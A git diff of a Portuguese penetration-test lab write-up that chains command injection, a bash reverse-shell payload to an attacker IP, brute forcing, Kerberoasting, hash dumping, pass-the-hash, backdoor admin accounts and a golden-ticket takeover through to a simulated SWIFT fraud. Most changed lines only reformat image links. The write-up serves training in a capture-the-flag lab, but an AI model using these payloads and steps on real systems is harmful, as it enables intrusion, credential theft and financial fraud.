@@ -52,27 +52,27 @@ No entanto, o backend do `SWIFT` expõe um aplicativo web interno em [http ://
 # Visão da Rede
 
 **Inicio do `Pentest`**\
-![](img/Pasted_image_20250603104157.png)
+![TXT](img/Pasted_image_20250603104157.png)
 
 **A Partir do 6º Tópico**\
 ![LOL](img/Pasted_image_20250610165722.png)
 
-**A Partir do 7º tópico**
-![[Pasted image 20250611174436.png]]
+**A Partir do 7º tópico**\
+![TXT](img/Pasted_image_20250611174436.png)
 
-**A Partir do 10º Tópico**
-![[Pasted image 20250616160555.png]]
+**A Partir do 10º Tópico**\
+![TXT](img/Pasted_image_20250616160555.png)
 
-**A Partir do 11º Tópico**
-![[Pasted image 20250618120227.png]]
+**A Partir do 11º Tópico**\
+![TXT](img/Pasted_image_20250618120227.png)
 
-**A Partir do 12º Tópico**
-![[Pasted image 20250620093257.png]]
+**A Partir do 12º Tópico**\
+![TXT](img/Pasted_image_20250620093257.png)
 
 **A Partir do 13º Tópico**
-![[Pasted image 20250620115757.png]]
+![TXT](img/Pasted_image_20250620_115757.png)
 
-**Redes/Máquinas TOTALMENTE Comprometidas!**![[Pasted image 20250621101033.png]]
+**Redes/Máquinas TOTALMENTE Comprometidas!**![TXT](img/Pasted_image_20250621_101033.png)
 
 
 ---
@@ -261,19 +261,19 @@ bank!
 
 ## 1.2 Autenticação
 ### 1.2.1 `Submit proof of compromise` (Envie prova de comprometimento)
-![[Pasted image 20250603113257.png]]
+![TXT](img/Pasted_image_20250603_113257.png)
 
 ### 1.2.2. `Verify past compromises` (Verifique comprometimentos anteriores)
-![[Pasted image 20250603113524.png]]
+![TXT](img/Pasted_image_20250603_113524.png)
 ### 1.2.3. `Verify email access`
-![[Pasted image 20250603113605.png]]
+![TXT](img/Pasted_image_20250603_113605.png)
 # 2. `IP: 10.200.89.13` (WEB - Linux)
 
 ## 2.1 Enumerando a rede 13
 
 ### 2.1.1 NMap: Listando Portas e Serviços
 
-![[Pasted image 20250603141530.png]]
+![TXT](img/Pasted_image_20250603_141530.png)
 
 ### 2.1.2 "Conheça o Time"
 Na URL `/october/index.php/demo/meettheteam`, consta o nome completo da equipe, e isso é importante para possíveis enumerações de usuários em algum serviço.
@@ -290,18 +290,18 @@ Ashley Chan, Keith Allen, Mohammad Ahmed, Laura Wood, Emily Harvey (Corporate CU
 ## 2.2 Gobuster: Listando todos os diretórios e arquivos
 
 `gobuster dir --url http://10.200.89.13/october/ --wordlist /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt -t 25`
-![[Pasted image 20250603145342.png]]
+![TXT](img/Pasted_image_20250603_145342.png)
 
 `gobuster dir --url http://10.200.89.13/october/index.php/ --wordlist /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt -t 25`
-![[Pasted image 20250609110030.png]]
+![TXT](img/Pasted_image_20250609_110030.png)
 ## 2.3 Arquivos Expostos
 
 `/october/storage/app/media/info.php`
-![[Pasted image 20250603145921.png]]
+![TXT](img/Pasted_image_20250603_145921.png)
 
 
 
-![[Pasted image 20250603151704.png]]
+![TXT](img/Pasted_image_20250603_151704.png)
 Presença de `.gitignore`? Será que há algum repositório Git exposto?
 ```
 [-] Testing http://10.200.89.13/.git/HEAD [404]
@@ -313,35 +313,35 @@ arthur-strelow@ubuntu-star:~/capstone$ git-dumper http://10.200.89.13/october/.g
 
 
 `/october/index.php/backend`
-![[Pasted image 20250609110142.png]]
+![TXT](img/Pasted_image_20250609_110142.png)
 
 
 
 # 3. `IP: 10.200.89.12` (VPN)
 ## 3.1 Enumerando a Rede 12
 ### 3.1.1 Procurando Portas e Serviços com NMAP
-![[Pasted image 20250609111236.png]]
+![TXT](img/Pasted_image_20250609_111236.png)
 
 ### 3.1.2 Gobuster: Será que existe algum diretório oculto?
 
-![[Pasted image 20250609113625.png]]
+![TXT](img/Pasted_image_20250609_113625.png)
 Esse diretório `/vpn`pode revelar algo interessante.
 
 **Acesso a VPN**
 
-![[Pasted image 20250609113730.png]]
+![TXT](img/Pasted_image_20250609_113730.png)
 
 ## 3.2 Analisando a aplicação
-![[Pasted image 20250617103939.png]]
+![TXT](img/Pasted_image_20250617_103939.png)
 
 Após prosseguir com a enumeração e identificar dois usuários, realizei testes com o usuário `laura.wood@corp.thereserve.loc` para verificar se era possível burlar mecanismos de autenticação ou acessar recursos indevidos (bypass).
 
-![[Pasted image 20250617104533.png]]
+![TXT](img/Pasted_image_20250617_104533.png)
 
 Observamos que, ao submeter o formulário via botão `submit`, a aplicação gera automaticamente um arquivo `.ovpn`, cujo nome segue o padrão `nome_enviado.ovpn`.  
 Explorando essa funcionalidade, testamos a execução de comandos no campo de entrada e, com uma payload especialmente construída, conseguimos obter uma reverse shell da aplicação:  
 `$(/bin/bash -c "/bin/bash -i >& /dev/tcp/10.50.87.116/9002 0>&1")`
-![[Pasted image 20250617104933.png]]
+![TXT](img/Pasted_image_20250617_104933.png)
 ## 3.3 Escalando Privilégios na Rede 12
 
 **Etapa 1**: Gerar chaves SSH na máquina do atacante:
@@ -357,22 +357,22 @@ sudo /bin/cp -r /tmp/.ssh /root/
 
 **Etapa 3**: Agora é só conectar.
 `ssh -i shell_key root@10.200.89.12`
-![[Pasted image 20250617111947.png]]
+![TXT](img/Pasted_image_20250617_111947.png)
 
 # 4. `IP: 12.100.1.8` (VPN Capturada da Rede 12)
 
 ## 4.1 `IFConfig`
 Ao conectar na `VPN`, temos um novo IP para analisar e, com isso, rodaremos um NMAP para mapear todos os `IPs` da aplicação, buscando o que pode haver de interessante nesse IP, já que sabemos que é um `/24` graças à máscara.
-![[Pasted image 20250609114637.png]]
+![TXT](img/Pasted_image_20250609_114637.png)
 
 ## 4.2 Mapeando a Rede
-![[Pasted image 20250609114931.png]]
+![TXT](img/Pasted_image_20250609_114931.png)
 ## 4.3 Enumerando Serviços e Portas
-![[Pasted image 20250609115155.png]]
+![TXT](img/Pasted_image_20250609_115155.png)
 
 ## 4.4 Rotas
 Eu imaginei que a VPN poderia dar acesso a outras máquinas na rede em uma sub-rede diferente ou intervalo diferente. Irei verificar as rotas
-![[Pasted image 20250609144024.png]]
+![TXT](img/Pasted_image_20250609_144024.png)
 
 > [!O que será que representa esses IP's?]
 > **10.200.89.21 & 10.200.89.22**
@@ -454,11 +454,11 @@ PORT      STATE SERVICE       VERSION
 
 As instruções fornecidas pelo servidor SSH (logo no início do `pentest`) indicavam credenciais de acesso a um e-mail. Com isso, foi utilizado um cliente de e-mail (neste caso, o Thunderbird) para acessar a caixa de entrada.
 
-![[Pasted image 20250609145817.png]]
+![TXT](img/Pasted_image_20250609_145817.png)
 
-![[Pasted image 20250609150014.png]]
+![TXT](img/Pasted_image_20250609_150014.png)
 
-![[Pasted image 20250609150200.png]]
+![TXT](img/Pasted_image_20250609_150200.png)
 
 ```
 (Texto acima traduzido)
@@ -541,23 +541,23 @@ with open('generated_passwords.txt2', 'w') as f:
 ## 6.1 Ataque de Força Bruta usando o `Hydra`
 
 ### 6.1.1 `10.200.89.11`
-![[Pasted image 20250609170404.png]]
+![TXT](img/Pasted_image_20250609_170404.png)
 
 > [!Duas Credenciais encontradas]
 > [25][smtp] host: 10.200.89.11   misc: (null)   login: laura.wood@corp.thereserve.loc   password: Password1@
 > [25][smtp] host: 10.200.89.11   misc: (null)   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!
 
 
-![[Pasted image 20250609170914.png]]
+![TXT](img/Pasted_image_20250609_170914.png)
 
 
-![[Pasted image 20250609171115.png]]
+![TXT](img/Pasted_image_20250609_171115.png)
 
 Ambas as caixas de entrada não contêm nenhuma mensagem.
 
 Tentado entrar no **SSH**
 
-![[Pasted image 20250610092203.png]]
+![TXT](img/Pasted_image_20250610_092203.png)
 
 
 ```
@@ -573,9 +573,9 @@ RDP         10.200.89.11    3389   MAIL             [-] thereserve.loc\aimee.wal
 
 ### 6.1.2 `10.200.89.12`
 
-![[Pasted image 20250609172747.png]]
+![TXT](img/Pasted_image_20250609_172747.png)
 
-![[Pasted image 20250609175234.png]]
+![TXT](img/Pasted_image_20250609_175234.png)
 
 
 
@@ -583,7 +583,7 @@ RDP         10.200.89.11    3389   MAIL             [-] thereserve.loc\aimee.wal
 
 ![[Pasted image 20250609175450.png]
 
-![[Pasted image 20250610092310.png]]
+![TXT](img/Pasted_image_20250610_092310.png)
 
 ### 6.1.4 `10.200.89.21`
 
@@ -592,7 +592,7 @@ Anteriormente, foram encontradas duas credenciais para acessar o e-mail. Então 
 > [!Credencial Reutilizada]
 > laura.wood:Password1@
 
-![[Pasted image 20250610114154.png]]
+![TXT](img/Pasted_image_20250610_114154.png)
 
 ### 6.1.5 `10.200.89.22`
 
@@ -600,18 +600,18 @@ Anteriormente, foram encontradas duas credenciais para acessar o e-mail. Então 
 > laura.wood:Password1@
 > mohammad.ahmed:Password1!
 
-![[Pasted image 20250610113728.png]]
+![TXT](img/Pasted_image_20250610_113728.png)
 
-![[Pasted image 20250610113856.png]]
+![TXT](img/Pasted_image_20250610_113856.png)
 
 # Primeira Flag
 
-![[Pasted image 20250610152457.png]]
-![[Pasted image 20250610152524.png]]
+![TXT](img/Pasted_image_20250610_152457.png)
+![TXT](img/Pasted_image_20250610_152524.png)
 
 
 
-![[Pasted image 20250610152543.png]]
+![TXT](img/Pasted_image_20250610_152543.png)
 ```
 (Texto acima traduzido)
 Olá,
@@ -623,14 +623,14 @@ Am0
 ```
 
 # Segunda Flag
-![[Pasted image 20250610165648.png]]
+![TXT](img/Pasted_image_20250610_165648.png)
 
 # Terceira Flag
-![[Pasted image 20250610173806.png]]
+![TXT](img/Pasted_image_20250610_173806.png)
 
 
 # 7. Bem vindo Ao Windows
-![[Pasted image 20250610173852.png]]
+![TXT](img/Pasted_image_20250610_173852.png)
 
 ```
 (Texto acima traduzido)
@@ -822,13 +822,13 @@ objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
 
 Encontrei essa pasta, e ela parece conter algumas informações bastante interessantes.
 
-![[Pasted image 20250611154501.png]]
+![TXT](img/Pasted_image_20250611_154501.png)
 
 Ao encontrar essa pasta e perceber que praticamente tudo nela gira em torno de backups, iniciei a busca por serviços e tarefas agendadas relacionados. Como se trata de uma pasta criada manualmente, e não pertencente ao sistema, esse nível de reconhecimento se torna necessário.
 
-![[Pasted image 20250611155514.png]]
+![TXT](img/Pasted_image_20250611_155514.png)
 
-![[Pasted image 20250611155557.png]]
+![TXT](img/Pasted_image_20250611_155557.png)
 
 Certo. Percebemos que existe um serviço de Backup, porém está `stopped`.
 
@@ -872,28 +872,28 @@ Após baixar a shell precisamos fazer algumas configurações
 
 Após concluir esses passos, é necessário mover o arquivo `rsh.exe` para a pasta do serviço de backup, renomeando-o para `Full.exe`, e então iniciar o serviço com o comando `net start backup`.
 
-![[Pasted image 20250611164409.png]]
+![TXT](img/Pasted_image_20250611_164409.png)
 
 ## 7.5 Persistindo
 
 `net user antr4x 'invasao140!@' /add`
-![[Pasted image 20250611170703.png]]
+![TXT](img/Pasted_image_20250611_170703.png)
 
 `net localgroup Administrators antr4x /add`
-![[Pasted image 20250611170908.png]]
+![TXT](img/Pasted_image_20250611_170908.png)
 
 `net localgroup "Remote Desktop Users" antr4x /add`
-![[Pasted image 20250611171111.png]]
+![TXT](img/Pasted_image_20250611_171111.png)
 
 
 # Quarta Flag
-![[Pasted image 20250616114442.png]]
+![TXT](img/Pasted_image_20250616_114442.png)
 
 # 8. Vamos para a próxima máquina
 
 ## 8.1 Enumerando a `WRK1`
 
-![[Pasted image 20250611180012.png]]
+![TXT](img/Pasted_image_20250611_180012.png)
 
 Ao analisar as pastas dos usuários, a maioria aparenta pertencer a contas comuns. No entanto, há um usuário em particular que chamou minha atenção e que pretendo investigar mais a fundo: o `svcOctober`.
 
@@ -1005,7 +1005,7 @@ Se ele **consegue descobrir a senha da conta de serviço**, ele pode:
 
 ### 8.2.1 Remotamente
 
-![[Pasted image 20250612114016.png]]
+![TXT](img/Pasted_image_20250612_114016.png)
 Deu certo? **Não!**
 
 ### 8.2.2 Localmente
@@ -1035,10 +1035,10 @@ Com isso vai gerar um arquivo com as hashes de e então rodaremos o hashcat
 
 `hashcat -m 13100 kerberos.txt --wordlist /home/arthur-strelow/capstone/generated_passwords.txt2`
 
-![[Pasted image 20250612145451.png]]
+![TXT](img/Pasted_image_20250612_145451.png)
 
 Executei o `Netexec` para identificar quais usuários conseguem se autenticar no serviço SMB.
-![[Pasted image 20250612153339.png]]
+![TXT](img/Pasted_image_20250612_153339.png)
 
 > [!Credenciais obtidas até o momento]
 > svcScanning:Password1!
@@ -1190,13 +1190,13 @@ $v."Get`Fie`ld"(...)
 
 
 
-![[Pasted image 20250613160944.png]]
+![TXT](img/Pasted_image_20250613_160944.png)
 
 Neste momento, **estou transferindo para minha máquina o arquivo gerado pelo BloodHound**, a fim de analisá-lo com mais detalhes.
 ## 9.2 Analisando o Active Directory
 
 Anteriormente, estávamos analisando o usuário "SvcScanning" e tentamos comprometê-lo por meio do ataque Kerberoasting — uma técnica que consiste em extrair o hash da senha de contas de serviço e tentar quebrá-lo offline. Nesse contexto, o melhor caminho para escalada é identificar e explorar os usuários Kerberoastable, ou seja, contas de serviço no Active Directory que possuem SPNs (Service Principal Names) associados.
-![[Pasted image 20250614105022.png]]
+![TXT](img/Pasted_image_20250614_105022.png)
 
 Ao analisar todo o caminho de ataque, observamos que o usuário `SVCSCANNING` é membro do grupo `SERVICES@CORP.THERESERVE.LOC` e possui permissão para executar comandos remotos via PowerShell (WinRM) no host `SERVER2.CORP.THERESERVE.LOC`.
 
@@ -1204,7 +1204,7 @@ Ao analisar todo o caminho de ataque, observamos que o usuário `SVCSCANNING` é
 
 Como temos acesso ao svcScanning, vamos executar comandos remotos para a máquina `server2`.
 
-![[Pasted image 20250614114407.png]]
+![TXT](img/Pasted_image_20250614_114407.png)
 
 Antes de tudo bora entender que está acontecendo.
 
@@ -1254,7 +1254,7 @@ Neste caso, optaremos pelo uso do **Chisel**, uma ferramenta leve e eficiente pa
 `chisel server -p 9001 --reverse`
 - `-p`: Porta escolhida para a máquina da vítima conectar
 - `--reverse`: Fará uma conexão reversa
-![[Pasted image 20250616085102.png]]
+![TXT](img/Pasted_image_20250616_085102.png)
 
 **Máquina Vítima/Comprometida**
 `.\chisel.exe client 12.100.1.8:9001 R:socks`
@@ -1264,20 +1264,20 @@ Neste caso, optaremos pelo uso do **Chisel**, uma ferramenta leve e eficiente pa
 
 Para validar que o túnel está funcionando corretamente e que conseguimos **acessar máquinas internas da rede**, utilizaremos o **Evil-WinRM**.
 `proxychains -q evil-winrm -i 10.200.89.32 -u svcScanning -p 'Password1!'`
-![[Pasted image 20250616093041.png]]
+![TXT](img/Pasted_image_20250616_093041.png)
 
 
 # Quinta Flag
-![[Pasted image 20250616160441.png]]
+![TXT](img/Pasted_image_20250616_160441.png)
 
 # Sexta Flag
-![[Pasted image 20250616160404.png]]
+![TXT](img/Pasted_image_20250616_160404.png)
 
 
 # 11. Comprometendo o domínio CORP
 
 Ao analisarmos novamente o gráfico gerado pelo BloodHound, observamos que a máquina **SERVER2** — que acabamos de comprometer — possui a permissão **GenericWrite** sobre a **GPO de Backup de DC**. Essa política de grupo está vinculada ao grupo **Domain Controllers** e, consequentemente, à máquina **CORPDC**. Caso consigamos explorar essa permissão, será possível **influenciar os controladores de domínio**, o que nos permitirá obter **acesso privilegiado ao Domain Controller (DC)**.
-![[Pasted image 20250614105022.png]]
+![TXT](img/Pasted_image_20250614_105022.png)
 
 
 Utilizando o script `GetUserSPNs.py`, foi possível solicitar tickets de serviço (TGS) para contas de serviço registradas no controlador de domínio que possuem Service Principal Names (SPNs) configurados. Essas contas são potencialmente vulneráveis a ataques de Kerberoasting.
@@ -1287,10 +1287,10 @@ Utilizando o script `GetUserSPNs.py`, foi possível solicitar tickets de serviç
 - **Contas Kerberoastáveis:**  
     Quando um serviço (como SQL, HTTP, etc.) é vinculado a uma conta de usuário do AD (em vez de uma conta de computador), essa conta pode ser alvo de **Kerberoasting**.
 
-![[Pasted image 20250617144952.png]]
+![TXT](img/Pasted_image_20250617_144952.png)
 Após enumerar contas de serviço no Active Directory com o script `GetUserSPNs.py`, extraímos os hashes TGS associados aos SPNs configurados. Esses tickets, criptografados com a senha NTLM da conta de serviço, foram salvos em um arquivo de texto. Reunimos todas as hashes coletadas e utilizamos a ferramenta `hashcat` para realizar um ataque offline com o objetivo de descobrir as senhas das contas de serviço, explorando a vulnerabilidade conhecida como Kerberoasting.
 
-![[Pasted image 20250617145646.png]]
+![TXT](img/Pasted_image_20250617_145646.png)
 
 **Depois de alguns dias quebrando a cabeça tentando acessar via RDP as máquinas com final `.31 e .32`, testando diferentes abordagens sem sucesso, finalmente encontrei uma possível solução para esse impasse.**
 
@@ -1303,7 +1303,7 @@ A alternativa que funcionou foi utilizar o script `secretsdump.py`, do framework
 - `corp.thereserve.loc`: 10.200.89.11
 - `@10.200.89.31`: IP do alvo (`Server1`), onde o script coleta os dados
 
-![[Pasted image 20250618103648.png]]
+![TXT](img/Pasted_image_20250618_103648.png)
 
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 ==Administrator:500:aad3b435b51404eeaad3b435b51404ee:e2c7044e93cf7e4d8697582207d6785c:::==
@@ -1341,14 +1341,14 @@ Ao executar o `secretsdump.py` novamente, desta vez utilizando as credenciais v�
 
 `proxychains -q secretsdump.py corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@10.200.89.102`
 
-![[Pasted image 20250618104946.png]]
+![TXT](img/Pasted_image_20250618_104946.png)
 
 > [!Hash do Administrator]
 > d3d4edcc015856e386074795aea86b3e
 
 `proxychains -q evil-winrm -i 10.200.89.102 -u Administrator -H d3d4edcc015856e386074795aea86b3e`
 
-![[Pasted image 20250618105521.png]]
+![TXT](img/Pasted_image_20250618_105521.png)
 
 ## 11.3 Criação de Conta com Privilégios Administrativos
 ### 11.3.1 `net user local`
@@ -1361,7 +1361,7 @@ net localgroup Administrators antr4x /add
 net localgroup "Remote Desktop Users" antr4x /add
 ```
 
-![[Pasted image 20250618114353.png]]
+![TXT](img/Pasted_image_20250618_114353.png)
 
 ### 11.3.2 Criação da conta no `Active Directory`
 ```
@@ -1372,16 +1372,16 @@ Enable-AdAccount -Identity "<samAccountName>"
 Add-ADGroupMember -Identity "Domain Admins"-Members <samAccountName>
 ```
 
-![[Pasted image 20250618115116.png]]
+![TXT](img/Pasted_image_20250618_115116.png)
 
 > [!Muito importar destacar]
 > A conexão via RDP só foi possível após a alteração do tempo limite (timeout), que anteriormente estava impedindo o estabelecimento da sessão.
 
 
 # Sétima Flag
-![[Pasted image 20250618115903.png]]
+![TXT](img/Pasted_image_20250618_115903.png)
 # Oitava Flag
-![[Pasted image 20250618120043.png]]
+![TXT](img/Pasted_image_20250618_120043.png)
 
 # 12. Comprometendo o Domínio ROOTDC
 
@@ -1443,7 +1443,7 @@ Na prática:
 - Se o usuário `joao@corp.local` quiser acessar um arquivo em um servidor de `finance.corp.local`, **ele pode**, porque há uma confiança entre os dois.
 - Isso facilita a **gestão centralizada e o acesso entre diferentes domínios**, sem precisar configurar permissões manuais entre cada um.
 
-![[Pasted image 20250618155807.png]]
+![TXT](img/Pasted_image_20250618_155807.png)
 
 Então para entender, o Domínio `CORP` confia no domínio `ROOT` e o domínio `BANK` também confia no domínio `ROOT`, tanto o domínio `CORP` quanto o `BANK` confiarão um no outro, pois o tipo de confiança é **transitivo**. Por tanto, se comprometermos um domínio filho, podemos acessar o outro domínio filho
 
@@ -1478,7 +1478,7 @@ O que mais você precisa para fazer isso:
     → Para **injetar como SID extra (ExtraSIDs)** no ticket e obter **controle sobre toda a floresta**
 
 ## 12.3 Obtendo KRBTGT Hash
-![[Pasted image 20250618173224.png]]
+![TXT](img/Pasted_image_20250618_173224.png)
 
 > [!KRBTGT Hash]
 > krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
@@ -1587,7 +1587,7 @@ d-----         9/7/2022   7:39 PM                Windows
 Uma maneira prática de fazer isso é utilizando o `PsExec` para executar comandos remotamente no controlador de domínio ROOTDC.
 
 `.\PsExec64.exe \\ROOTDC.thereserve.loc cmd.exe`
-![[Pasted image 20250620091426.png]]
+![TXT](img/Pasted_image_20250620_091426.png)
 
 Caso o `psexec64` não funcione ou retorne um erro como `Couldn't access ROOTDC.thereserve.loc`, uma alternativa viável é utilizar o `winrs`, que também permite execução remota de comandos: `winrs -r:rootdc.thereserve.loc cmd.exe`
 
@@ -1595,10 +1595,10 @@ Esse comando estabelece uma sessão remota com o `ROOTDC`, utilizando o protocol
 
 
 # Décima Quinta Flag
-![[Pasted image 20250620093103.png]]
+![TXT](img/Pasted_image_20250620_093103.png)
 
 # Décima Sexta Flag
-![[Pasted image 20250620092840.png]]
+![TXT](img/Pasted_image_20250620_092840.png)
 
 ## 12.8 Criando uma persistência
 **`New-ADUser PK2212`**
@@ -1613,7 +1613,7 @@ Define a senha do usuário **PK2212** como `"Password123!"`.
 **`Enable-ADAccount -Identity PK2212`**
 Ativa a conta do usuário, permitindo que ele faça login.
 
-![[Pasted image 20250620101901.png]]
+![TXT](img/Pasted_image_20250620_101901.png)
 
 ## 12.9 Túnel dentro de outro Túnel
 Essa parte foi especialmente interessante por conta de uma ideia de nomenclatura e arquitetura de rede que sempre achei curiosa e viável. Inicialmente, considerei a possibilidade de criar um **túnel dentro de outro túnel** — uma espécie de “rede sobre rede”. Como já tínhamos acesso à máquina **ROOTDC** (localizada na rede `100`), poderíamos ter feito esse acesso **passando por dentro do túnel da rede `32`**, que já estava estabelecido. Dessa forma, a rede `100` seria alcançada através da rede `32`, permitindo uma conexão RDP diretamente da máquina atacante.
@@ -1630,7 +1630,7 @@ Com isso, consegui autenticar com sucesso via RDP e obtive **acesso completo ao 
 
 
 > **Lembrando que essa conexão RDP (Rede 101) está dentro de outra conexão RDP (Rede 100)**
-![[Pasted image 20250620105454.png]]
+![TXT](img/Pasted_image_20250620_105454.png)
 
 # 13. Entrando no Domínio BANK
 
@@ -1651,22 +1651,22 @@ Em seguida, concedo privilégios administrativos adicionando o usuário ao grupo
 Com isso, o usuário `reduser` passa a ter **acesso total às máquinas do domínio**, permitindo logins via RDP, execução remota e coleta das informações necessárias.
 
 # Nona Flag
-![[Pasted image 20250620112633.png]]
+![TXT](img/Pasted_image_20250620_112633.png)
 
 # Décima Flag
-![[Pasted image 20250620113217.png]]
+![TXT](img/Pasted_image_20250620_113217.png)
 
 # Décima Primeira Flag
-![[Pasted image 20250620114716.png]]
+![TXT](img/Pasted_image_20250620_114716.png)
 
 # Décima Segunda Flag
-![[Pasted image 20250620115149.png]]
+![TXT](img/Pasted_image_20250620_115149.png)
 
 # Décima Terceira Flag
-![[Pasted image 20250620115359.png]]
+![TXT](img/Pasted_image_20250620_115359.png)
 
 # Décima Quarta Flag
-![[Pasted image 20250620115623.png]]
+![TXT](img/Pasted_image_20250620_115623.png)
 
 # 14. Domínio SWIFT
 ## 14.1 Enumerando o Domínio
@@ -1674,11 +1674,11 @@ Com isso, o usuário `reduser` passa a ter **acesso total às máquinas do domí
 **Inicialmente, criei um usuário no Active Directory com o objetivo de estabelecer persistência no ambiente.**  
 Em seguida, passei a analisar os grupos existentes no domínio e encontrei dois que chamaram bastante atenção por sua natureza incomum.
 
-![[Pasted image 20250620145120.png]]
+![TXT](img/Pasted_image_20250620_145120.png)
 
 Então eu inseri meu usuário criado nesses dois grupos e no `"Domain Admins"` (por conta de privilégios).
 
-![[Pasted image 20250620150038.png]]
+![TXT](img/Pasted_image_20250620_150038.png)
 
 ## 14.2 Informações cedidas pela própria máquina (Capstone)
 
@@ -1708,62 +1708,62 @@ Usando esses detalhes, execute as seguintes etapas:
 **A primeira etapa do processo descrito no relatório consiste em realizar a solicitação de uma transferência bancária no valor de 10 milhões de dólares.**  
 Para isso, é necessário acessar a aplicação web do sistema SWIFT, navegar até a seção destinada à realização de transações ("Make a Transaction") e, em seguida, emitir a ordem de transferência, informando corretamente os identificadores da conta de origem (remetente) e da conta de destino (destinatário). A solicitação da transferência é o passo inicial que habilita a continuação das ações previstas no cenário, sendo essencial para a execução completa das etapas seguintes.
 
-![[Pasted image 20250620173308.png]]
+![TXT](img/Pasted_image_20250620_173308.png)
 
 # Décima Sétima Flag
 
-![[Pasted image 20250620173340.png]]
+![TXT](img/Pasted_image_20250620_173340.png)
 
 # 14.4 Fazendo a captura das solicitações de transferência
 
 Ao analisarmos os usuários pertencentes ao grupo **"Payment Captures"**, identificamos diversos membros, inclusive o usuário **"admin"**, que está atualmente infiltrado nesse grupo. No entanto, neste momento, esse acesso não nos oferece uma vantagem significativa, pois o objetivo atual é identificar **usuários com credenciais expostas em texto claro**.
 
 Dentre os usuários listados, destacamos **"g.watson"** como um possível alvo. A estratégia, portanto, será **realizar a troca da senha desse usuário**, permitindo-nos acessá-lo diretamente e prosseguir com as ações necessárias sob o contexto de suas permissões.
-![[Pasted image 20250620173630.png]]
+![TXT](img/Pasted_image_20250620_173630.png)
 
-![[Pasted image 20250620173936.png]]
+![TXT](img/Pasted_image_20250620_173936.png)
 
 Observamos que os usuários pertencentes ao grupo **"Payment Captures"** estão restritos a realizar autenticação apenas na máquina **WORK1**. Diante dessa limitação, o próximo passo será **analisar o ambiente presente nessa máquina**.
 
 ## 14.5 Acessando a máquina `WORK1`
 
 Hmm, encontrei um arquivo que parece interessante.
-![[Pasted image 20250620174228.png]]
+![TXT](img/Pasted_image_20250620_174228.png)
 
 E aqui, obtive a credencial em texto claro.
-![[Pasted image 20250620174249.png]]
+![TXT](img/Pasted_image_20250620_174249.png)
 
 > [!Credencial encontrada para a página SWIFT BANK]
 > Corrected1996
 
 ## 14.6 Autenticando com usuário com privilégio
 Agora, com a credencial em mãos, vamos nos autenticar.
-![[Pasted image 20250621092652.png]]
+![TXT](img/Pasted_image_20250621_092652.png)
 
 ## 14.7 Transações capturadas
 Certo, conseguimos reunir todas as transações pendentes para enviar ao último setor de aprovação. Mas, antes disso, precisamos acessar a página inicial e confirmar a transação utilizando o PIN que recebemos por e-mail.
-![[Pasted image 20250620175000.png]]
+![TXT](img/Pasted_image_20250620_175000.png)
 
 
 # Décima Oitava Flag
-![[Pasted image 20250620175110.png]]
+![TXT](img/Pasted_image_20250620_175110.png)
 
 ## 14.8 Explorando usuários do grupo "Payments Approvers"
 Agora, preciso mudar a senha de um usuário que está no grupo **Payment Approvers**, para conseguir acessar a máquina **JMP** e procurar senhas e arquivos que possamos explorar para aprovar a transferência de 10 milhões. Começaremos pelo usuário **`a.holt`**, e, para isso, alteraremos sua senha para **`Password1!`**.
 
-![[Pasted image 20250621093154.png]]
+![TXT](img/Pasted_image_20250621_093154.png)
 
 ### 14.8.1 Acessando a Pasta do Domínio
 Então, comecei a pensar que poderíamos verificar se o usuário possui algum acesso direto a pastas do domínio e se há nelas alguma informação que possa ser interessante para nós.
-![[Pasted image 20250621093626.png]]
+![TXT](img/Pasted_image_20250621_093626.png)
 
 ### 14.8.2. Encontrando um Script de "Aprovador"
 
 Na pasta de scripts, havia apenas um arquivo em Python que, ao ser analisado, revelou uma automação incompleta para aprovação de pagamentos. No entanto, o arquivo continha uma senha em texto claro, o que facilitou a autenticação e permitiu que realizássemos a aprovação manualmente.
 
-![[Pasted image 20250621093642.png]]
+![TXT](img/Pasted_image_20250621_093642.png)
 
-![[Pasted image 20250621094008.png]]
+![TXT](img/Pasted_image_20250621_094008.png)
 
 > [!Credencial de Aprovador encontrada]
 > username = "r.davies" #Change this to your approver username
@@ -1772,10 +1772,10 @@ Na pasta de scripts, havia apenas um arquivo em Python que, ao ser analisado, re
 ### 14.8.3. Aprovando a Transferência de U$ 10 Milhões
 Com todas as informações e credenciais obtidas, cheguei à parte fundamental do que foi solicitado anteriormente: a prova de conceito demonstrando que é possível realizar uma transferência de uma conta para outra. Além de solicitar a transferência, também conseguimos efetuar sua aprovação.
 
-![[Pasted image 20250621094228.png]]
+![TXT](img/Pasted_image_20250621_094228.png)
 
 # Décima Nona Flag
-![[Pasted image 20250621095823.png]]
+![TXT](img/Pasted_image_20250621_095823.png)
 
 # 15. `SWIFT`: Transferência Fraudulenta Concluida
 
@@ -1790,9 +1790,9 @@ Uma vez feito isso, siga estas etapas:
 5. Lucro?
 ```
 
-![[Pasted image 20250621100906.png]]
+![TXT](img/Pasted_image_20250621_100906.png)
 
 Basicamente, essa etapa finaliza as ações realizadas anteriormente. Com isso, concluo essa incrível máquina, que proporcionou diversos aprendizados e noções práticas sobre Active Directory, Windows, lógica e, principalmente, a importância de pensar fora da caixa.
 
 # Vigésima Flag
-![[Pasted image 20250621100952.png]]
+![TXT](img/Pasted_image_20250621_100952.png)
